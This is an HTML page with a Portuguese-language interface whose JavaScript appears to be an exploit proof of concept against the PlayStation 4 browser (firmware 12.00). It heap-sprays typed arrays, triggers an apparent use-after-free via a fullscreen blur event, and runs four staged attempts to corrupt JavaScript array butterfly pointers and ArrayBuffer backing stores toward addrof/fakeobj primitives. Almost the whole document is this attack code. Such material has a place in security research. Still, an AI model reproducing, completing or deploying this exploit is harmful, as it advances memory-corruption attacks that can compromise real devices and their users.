<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Butterfly Attack</title>
</head>
<body>
    <h1>PS4 UAF - Butterfly Pointer Corruption v10.0</h1>
    <h2>FW 12.00 - Tentando Corromper Headers de Objeto</h2>
    
    <button onclick="runButterflyAttack()">BUTTERFLY ATTACK</button>
    <br><br>
    <button onclick="clearLog()">LIMPAR</button>
    
    <hr>
    <div id="log"></div>
    
    <script>
        function makeFloat(hi, lo) {
            const b = new ArrayBuffer(8);
            const u = new Uint32Array(b);
            u[0] = lo;
            u[1] = hi;
            return new Float64Array(b)[0];
        }
        
        function f2h(f) {
            const b = new ArrayBuffer(8);
            new Float64Array(b)[0] = f;
            const u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }
        
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            return makeFloat(hi, lo);
        }
        
        const P_A = 2.121995791e-314;
        
        let globalVictims = [];
        let globalCorrupted = null;
        
        function log(msg, color) {
            const d = document.getElementById('log');
            const t = new Date().toLocaleTimeString();
            d.innerHTML += '<div style="color:' + (color || 'black') + '">[' + t + '] ' + msg + '</div>';
            d.scrollTop = d.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }
        
        function runButterflyAttack() {
            clearLog();
            log('==========================================', 'blue');
            log('BUTTERFLY POINTER CORRUPTION ATTACK', 'blue');
            log('==========================================', 'blue');
            log('Objetivo: Corromper headers de objeto, nao apenas dados', 'cyan');
            log('', '');
            
            log('[FASE 1] Preparando estruturas', 'blue');
            
            // Estrutura 1: TypedArrays para UAF
            let typedCtrl = [];
            for(let i = 0; i < 5000; i++) {
                typedCtrl.push(new Float64Array(8));
                typedCtrl[i][0] = i;
            }
            
            // Estrutura 2: Arrays JS regulares (candidatos a butterfly corruption)
            globalVictims = [];
            for(let i = 0; i < 1000; i++) {
                let arr = [1.1, 2.2, 3.3, 4.4, 5.5];
                arr.marker = i; // Identificador
                globalVictims.push(arr);
            }
            
            log('  5000 TypedArrays criados', 'green');
            log('  1000 Arrays regulares (vitimas) criados', 'green');
            log('', '');
            
            log('[FASE 2] Trigger UAF', 'blue');
            log('  APERTE OPTIONS!', 'red');
            log('', '');
            
            document.documentElement.webkitRequestFullscreen();
            
            window.onblur = function() {
                log('[TRIGGER] Blur detectado!', 'orange');
                
                // Spray ANTES de liberar memória das vítimas
                let spray1 = [];
                for(let i = 0; i < 8000; i++) {
                    spray1.push(new Float64Array(8));
                    spray1[i].fill(P_A);
                }
                
                log('  Spray 1: 8000 TypedArrays', 'cyan');
                
                // Busca TypedArray corrompido
                globalCorrupted = null;
                let idx = -1;
                
                for(let i = 0; i < typedCtrl.length; i++) {
                    if(typedCtrl[i][0] === P_A) {
                        globalCorrupted = typedCtrl[i];
                        idx = i;
                        break;
                    }
                }
                
                if(!globalCorrupted) {
                    log('[UAF] NAO DETECTADO', 'red');
                    return;
                }
                
                log('[UAF] TypedArray corrompido detectado! Index: ' + idx, 'green');
                log('', '');
                
                log('==========================================', 'purple');
                log('ATAQUES DE BUTTERFLY CORRUPTION', 'purple');
                log('==========================================', 'purple');
                log('', '');
                
                // ATAQUE 1: Forçar realocação de arrays vítimas
                log('[ATTACK1] Array Reallocation', 'blue');
                log('  Forçando realocação de arrays vitimas...', 'cyan');
                
                for(let i = 0; i < globalVictims.length; i++) {
                    // Adiciona elemento (força realocação do butterfly)
                    globalVictims[i].push(9.9);
                    globalVictims[i].push(10.1);
                }
                
                log('  Arrays realocados com novos elementos', 'green');
                
                // Verifica se algum array teve length corrompido
                let lengthCorrupted = 0;
                for(let i = 0; i < globalVictims.length; i++) {
                    if(globalVictims[i].length !== 7) { // Esperado: 5 + 2 = 7
                        lengthCorrupted++;
                        log('  FOUND: victim[' + i + '].length = ' + globalVictims[i].length + ' (esperado 7)', 'green');
                    }
                }
                
                if(lengthCorrupted > 0) {
                    log('[ATTACK1] SUCESSO! ' + lengthCorrupted + ' arrays com length corrompido', 'green');
                } else {
                    log('[ATTACK1] FAIL - Nenhum length corrompido', 'orange');
                }
                log('', '');
                
                // ATAQUE 2: Escrita via TypedArray corrompido
                log('[ATTACK2] TypedArray Write to Butterfly', 'blue');
                log('  Tentando escrever valores que parecem ponteiros...', 'cyan');
                
                // Padrão de ponteiro plausível (alinhado, região alta)
                const fakePtr1 = makeFloat(0x00007FFF, 0xFFFF0000);
                const fakePtr2 = makeFloat(0x00007FFF, 0xFFFF1000);
                
                globalCorrupted[0] = fakePtr1;
                globalCorrupted[1] = fakePtr2;
                
                log('  Escritos: ' + f2h(fakePtr1) + ', ' + f2h(fakePtr2), 'cyan');
                
                // Verifica se algum array vítima foi afetado
                let ptrFound = false;
                for(let i = 0; i < Math.min(100, globalVictims.length); i++) {
                    try {
                        const len = globalVictims[i].length;
                        if(len > 1000000 || len < 0) {
                            log('  FOUND: victim[' + i + '].length = ' + len + ' (ANORMAL!)', 'green');
                            ptrFound = true;
                        }
                    } catch(e) {
                        log('  FOUND: victim[' + i + '] inacessível (crash potencial)', 'orange');
                    }
                }
                
                if(ptrFound) {
                    log('[ATTACK2] SUCESSO! Butterfly possivelmente corrompido', 'green');
                } else {
                    log('[ATTACK2] FAIL - Sem efeito observável', 'orange');
                }
                log('', '');
                
                // ATAQUE 3: Spray de Arrays DEPOIS do UAF
                log('[ATTACK3] Post-UAF Array Spray', 'blue');
                log('  Criando 5000 novos arrays regulares...', 'cyan');
                
                let postVictims = [];
                for(let i = 0; i < 5000; i++) {
                    let arr = [7.7, 8.8, 9.9];
                    arr.postMarker = i;
                    postVictims.push(arr);
                }
                
                log('  Escrevendo padrões via TypedArray corrompido...', 'cyan');
                
                const testPattern = makeFloat(0x41414141, 0x41414141);
                for(let i = 0; i < 8; i++) {
                    globalCorrupted[i] = testPattern;
                }
                
                // Verifica se algum post-victim foi afetado
                let postAffected = 0;
                for(let i = 0; i < postVictims.length; i++) {
                    try {
                        for(let j = 0; j < postVictims[i].length; j++) {
                            const val = postVictims[i][j];
                            if(val === testPattern) {
                                log('  FOUND: postVictim[' + i + '][' + j + '] = 0x41414141...', 'green');
                                postAffected++;
                            }
                        }
                    } catch(e) {
                        // Ignorar erros
                    }
                }
                
                if(postAffected > 0) {
                    log('[ATTACK3] SUCESSO! ' + postAffected + ' arrays afetados', 'green');
                } else {
                    log('[ATTACK3] FAIL - Sem propagação para post-victims', 'orange');
                }
                log('', '');
                
                // ATAQUE 4: ArrayBuffer backing store corruption
                log('[ATTACK4] ArrayBuffer Backing Store', 'blue');
                log('  Criando ArrayBuffers compartilhados...', 'cyan');
                
                let buffers = [];
                for(let i = 0; i < 1000; i++) {
                    let buf = new ArrayBuffer(64);
                    let view = new Uint32Array(buf);
                    view[0] = 0xDEADBEEF;
                    view[1] = 0xCAFEBABE;
                    buffers.push({buf, view});
                }
                
                log('  Verificando se algum buffer foi corrompido...', 'cyan');
                
                let bufferCorrupted = 0;
                for(let i = 0; i < buffers.length; i++) {
                    const v0 = buffers[i].view[0];
                    const v1 = buffers[i].view[1];
                    
                    if(v0 !== 0xDEADBEEF || v1 !== 0xCAFEBABE) {
                        log('  FOUND: buffer[' + i + '] corrompido: [0]=0x' + v0.toString(16) + ', [1]=0x' + v1.toString(16), 'green');
                        bufferCorrupted++;
                    }
                }
                
                if(bufferCorrupted > 0) {
                    log('[ATTACK4] SUCESSO! ' + bufferCorrupted + ' buffers corrompidos', 'green');
                } else {
                    log('[ATTACK4] FAIL - Backing stores intactos', 'orange');
                }
                log('', '');
                
                // ANÁLISE FINAL
                log('==========================================', 'green');
                log('ANÁLISE DE BUTTERFLY CORRUPTION', 'green');
                log('==========================================', 'green');
                log('', '');
                
                const totalSuccess = lengthCorrupted + (ptrFound ? 1 : 0) + postAffected + bufferCorrupted;
                
                if(totalSuccess > 0) {
                    log('✓ SUCESSO PARCIAL!', 'green');
                    log('  Attacks bem-sucedidos: ' + totalSuccess, 'green');
                    log('', '');
                    log('  Isso significa:', 'cyan');
                    log('  - UAF atinge headers de objeto (não só dados)', 'cyan');
                    log('  - Butterfly pointers podem ser corrompidos', 'cyan');
                    log('  - Potencial para addrof/fakeobj avançado', 'cyan');
                } else {
                    log('✗ FALHA COMPLETA', 'red');
                    log('  Nenhum header corrompido detectado', 'red');
                    log('', '');
                    log('  Isso confirma:', 'orange');
                    log('  - UAF limitado a data buffers', 'orange');
                    log('  - Heap segregation separa headers de dados', 'orange');
                    log('  - addrof/fakeobj não possíveis com este UAF', 'orange');
                }
                log('', '');
                
                window.butterflyResults = {
                    lengthCorrupted: lengthCorrupted,
                    ptrFound: ptrFound,
                    postAffected: postAffected,
                    bufferCorrupted: bufferCorrupted,
                    totalSuccess: totalSuccess
                };
                
                log('window.butterflyResults exportado', 'blue');
            };
        }
    </script>
</body>
</html>
